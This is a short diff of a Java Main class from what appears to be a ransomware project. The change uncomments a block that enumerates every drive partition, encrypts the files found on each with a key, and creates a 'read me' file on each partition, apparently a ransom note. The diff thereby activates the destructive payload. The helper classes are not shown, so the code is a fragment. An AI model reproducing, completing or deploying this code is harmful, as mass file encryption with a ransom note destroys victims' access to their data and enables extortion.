@@ -18,7 +18,7 @@ import java.util.ArrayList;
 
 public class Main {
     public static void main(String[] args) {
-        /*FileWriter operationFile = null;
+        FileWriter operationFile = null;
         // Get os
         String os = FunctionsHelper.getOs();
 
@@ -44,7 +44,7 @@ public class Main {
         File[] partitions = files.getDrivers();
         for (File partition : partitions) {
             // Encryption files
-            Encryption.encryption(files.scanFiles(partition, To.ENCRYPTION), key);
+            Encryption.encryption(files.scanFiles(partition, To.ENCRYPTION, false), key);
             // Create read me file
             try {
                 readMeFile.create(partition.getPath());
@@ -77,7 +77,7 @@ public class Main {
                 }).start();
             }
         } catch (IOException ignored) {
-        }*/
+        }
 
         // Test
 //        File file = new File("tests/test.txt");
